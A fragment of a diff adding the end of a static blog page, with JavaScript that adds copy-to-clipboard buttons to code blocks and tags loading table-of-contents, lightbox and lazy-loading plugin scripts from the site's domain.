+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1umph.top/plugins/TOC.js'></script><script src='https://7r1umph.top/plugins/lightbox.js'></script><script src='https://7r1umph.top/plugins/LazyLoadImages.js'></script>
+
+</html>
